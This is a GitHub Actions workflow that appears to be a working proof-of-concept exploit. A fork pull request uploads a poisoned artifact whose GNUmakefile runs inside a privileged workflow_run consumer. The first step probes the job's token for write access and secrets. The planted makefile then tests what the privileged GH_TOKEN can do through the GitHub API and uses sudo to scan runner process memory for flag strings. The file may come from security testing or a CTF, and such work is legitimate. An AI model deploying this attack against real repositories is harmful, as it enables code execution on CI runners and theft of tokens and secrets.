name: Spec PR
# Fork-PR head workflow. Runs in the base repo's pull_request context with a
# read-only token, but uploads an artifact that the privileged workflow_run
# consumer (Validate Client Generation) blindly extracts into its workspace.
on:
  pull_request:

permissions:
  contents: read

jobs:
  bundle-spec:
    name: Bundle Spec
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Probe own token permissions
        run: |
          echo "SELF_RUN=$GITHUB_RUN_ID EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY"
          curl -sS -o /tmp/repo.json -w "SELF_REPO_HTTP=%{http_code}\n" \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY"
          head -c 600 /tmp/repo.json; echo
          curl -sS -o /dev/null -w "SELF_CONTENTS_WRITE_HTTP=%{http_code}\n" -X PUT \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/omp-probe-self.txt" \
            -d '{"message":"probe","content":"aGk="}'
          curl -sS -o /tmp/secrets.json -w "SELF_SECRETS_HTTP=%{http_code}\n" \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets"
          head -c 300 /tmp/secrets.json; echo
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Craft poisoned artifact
        run: |
          mkdir -p pydo
          printf 'openapi: 3.0.0\ninfo:\n  title: poc\n  version: 1.0.0\npaths: {}\n' > openapi-bundled.yaml
          python3 - <<'PY'
          lines = [
              "generate:",
              "\t@echo PWNED_MARKER_VALIDATE_RCE_V3",
              "\t@id; sudo -n id 2>&1 | head -1; echo SUDO_RC=$$?",
              "\t@echo RUN=$$GITHUB_RUN_ID REPO=$$GITHUB_REPOSITORY WORKFLOW=$$GITHUB_WORKFLOW",
              "\t@echo TOKEN_LEN=$${#GH_TOKEN}",
              "\t@echo ENV_NAMES: `env | cut -d= -f1 | tr '\\n' ' '`",
              "\t@echo ACTIONS_ID_TOKEN_REQUEST_URL_SET=$${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}",
              "\t@curl -sS -o /tmp/u.json -w 'PROBE_GET_USER=%{http_code}\\n' -H 'Authorization: Bearer '$$GH_TOKEN https://api.github.com/user; head -c 120 /tmp/u.json; echo",
              "\t@curl -sS -o /tmp/br.json -w 'PROBE_BRANCH_PROTECTION=%{http_code}\\n' -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/branches/main/protection'",
              "\t@curl -sS -o /tmp/ck.json -w 'PROBE_CHECK_RUN_CREATE=%{http_code}\\n' -X POST -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/check-runs' -d '{\"name\":\"omp\",\"head_sha\":\"'$$GITHUB_SHA'\"}'",
              "\t@curl -sS -o /tmp/pu.json -w 'PROBE_PR_PATCH=%{http_code}\\n' -X PATCH -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/pulls/2' -d '{\"title\":\"probe\"}'",
              "\t@curl -sS -o /tmp/rd.json -w 'PROBE_REPO_DISPATCH=%{http_code}\\n' -X POST -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/dispatches' -d '{\"event_type\":\"omp\"}'",
              "\t@curl -sS -o /tmp/perm.json -w 'PROBE_COLLAB_PERMISSION=%{http_code}\\n' -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/collaborators/lazyhacker6/permission'",
              "\t@echo MEMORY_SCAN_START",
              "\t@sudo -n sh -c 'for p in $$(pgrep -f \"Runner.Worker|Runner.Listener\"); do echo pid=$$p; timeout 45 grep -a -o -m3 \"FLAG{[^}]*}\" /proc/$$p/mem 2>/dev/null; timeout 45 grep -a -o -m3 \"TRIAGE_FLAG\" /proc/$$p/mem 2>/dev/null; done' 2>&1 | head -20 || true",
              "\t@sudo -n sh -c 'grep -r -a -o -m3 \"FLAG{[^}]*}\" /home/runner /tmp /var/tmp 2>/dev/null | head -5' || true",
              "\t@echo MEMORY_SCAN_END",
              "\t@echo === PWNED_END ===",
              "test-mocked:",
              "\t@true",
          ]
          open("pydo/GNUmakefile", "w").write("\n".join(lines) + "\n")
          PY
          ls -la pydo

      - uses: actions/upload-artifact@v4
        with:
          name: openapi-bundled
          path: |
            openapi-bundled.yaml
            pydo/GNUmakefile
